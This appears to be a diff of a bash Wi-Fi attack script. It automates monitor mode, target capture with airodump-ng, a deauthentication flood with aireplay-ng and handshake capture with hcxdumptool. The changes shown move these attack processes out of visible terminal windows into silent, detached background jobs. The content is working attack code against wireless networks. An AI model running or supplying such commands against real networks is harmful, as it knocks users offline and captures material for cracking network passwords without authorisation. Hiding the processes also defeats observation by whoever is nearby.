@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version=3.6.6 # 29/5/25 03:00
+version=3.6.6 # 29/5/25 15:30
 
 
 ### Changlog ###
@@ -353,7 +353,7 @@ function adapter_config() {
 
     # If already in monitor mode, skip enabling it again
     if [[ "$wifi_adapter" == *"mon" ]]; then
-        echo -e "\n${NEON_GREEN}    [✔]${RESET} Adapter is already in monitor mode.\n\n"
+        echo -e "${NEON_GREEN}    [✔]${RESET} Adapter is already in monitor mode.\n\n"
         return 0
     fi
 
@@ -363,7 +363,7 @@ function adapter_config() {
     mon_adapter=$(iw dev | awk '/Interface/ && /mon$/ {print $2}' | grep "^${wifi_adapter}mon$")
 
     if [[ -n "$mon_adapter" ]]; then
-        echo -e "\n${NEON_GREEN}    [✔]${RESET} Successfully switched $wifi_adapter to monitor mode.\n\n"
+        echo -e "${NEON_GREEN}    [✔]${RESET} Successfully switched $wifi_adapter to monitor mode.\n\n"
         wifi_adapter=$mon_adapter        
     else
         echo -e "${RED}    [✘] Failed to start $wifi_adapter in monitor mode.${RESET} Check your adapter and try again.\n\n"
@@ -646,8 +646,13 @@ function choose_network() {
 function validate_network() {
     echo -e "${BLUE}[*] Validating Network:${RESET}"
     
+
+    #gnome-terminal --geometry=95x12-10000-10000 -- script -c "airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter" "$targets_path/$bssid_name/airodump_output.txt"
+
+
     # Open airodump-ng in a hidden terminal
-    gnome-terminal --geometry=95x12-10000-10000 -- script -c "airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter" "$targets_path/$bssid_name/airodump_output.txt"
+    (airodump-ng --band abg -c $channel -w $targets_path/$bssid_name/$bssid_name -d $bssid_address $wifi_adapter > "$targets_path/$bssid_name/airodump_output.txt" 2>&1 < /dev/null) & disown
+
 
     found=0
     echo -en "    ${BOLD}[⏳]${RESET} Checking.."
@@ -732,7 +737,10 @@ function devices_scanner() {
 
 
 function deauth_attack() {
-    gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"
+    #gnome-terminal --geometry=78x4-10000-10000 -- timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"
+    
+   (timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter" > /dev/null 2>&1 < /dev/null) & disown   
+   
 }
 
 
@@ -788,10 +796,12 @@ function attacks() {
     # Start hcxdumptool in hidden terminal
     if [[ -n "$band" ]]; then
         channel_with_band="${channel}${band}"
-        gnome-terminal --geometry=95x30+0-280 -- bash -c "hcxdumptool -i '${wifi_adapter}' -c '$channel_with_band' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
+        #gnome-terminal --geometry=95x30+0-280 -- bash -c "hcxdumptool -i '${wifi_adapter}' -c '$channel_with_band' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
+        (hcxdumptool -i $wifi_adapter -c $channel_with_band -w $pcapng_file -F --bpf=${targets_path}/${bssid_name}/filter.bpf --rds=1 > /dev/null 2>&1 < /dev/null) & disown
     else
         echo "Warning: Unknown channel ($channel), running without -c"
-        gnome-terminal --geometry=95x30+0-280 -- bash -c "hcxdumptool -i '${wifi_adapter}' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
+        #gnome-terminal --geometry=95x30+0-280 -- bash -c "hcxdumptool -i '${wifi_adapter}' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
+        (hcxdumptool -i $wifi_adapter -w $pcapng_file -F --bpf=${targets_path}/${bssid_name}/filter.bpf --rds=1 > /dev/null 2>&1 < /dev/null) & disown
     fi
 
     sleep 2
